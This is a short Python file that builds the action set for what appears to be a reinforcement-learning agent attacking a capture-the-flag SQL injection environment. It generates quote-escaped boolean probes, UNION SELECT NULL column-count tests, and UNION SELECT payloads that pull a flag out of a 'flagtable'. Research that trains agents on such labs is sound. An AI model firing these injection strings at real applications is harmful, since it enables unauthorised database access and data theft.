
def generate_actions(max_columns = 5, escapes = ["'", '"',""]):
    prelim = [
        "{0} and 1=1 --",
        "{0} and 1=2 --"
    ]

    #XXX To use row_confirmation we need to update the environment to give a reward for the correct escape and rows, i.e. extracting NONE,NONE,NONE..
    #Therefore maybe we drow the row confirmation actions for simplicity
    row_confirmation = []
    flag_actions = []
    for i in range(1,max_columns+1):
        row_confirmation.append("{0} union select"+ " NULL,"*i)
        flag_actions.append("{0} union select flag," + " NULL,"*(i-1))

        #Maybe not the best way to remove the last comma and add comment lines, but it will do
        row_confirmation[-1] = row_confirmation[-1][:-1] + " --"
        flag_actions[-1] = flag_actions[-1][:-1] +  " from flagtable --"


    action_types = [prelim, row_confirmation, flag_actions]

    all_actions = []
    #Finally create all the actions
    for escape in escapes:
        for action_type in action_types:
            for action in action_type:
                all_actions.append(action.format(escape))

    return all_actions




if __name__ == "__main__":
    print(generate_actions())
    counter = 0
    for action in generate_actions():
        print(counter, action)
        counter += 1
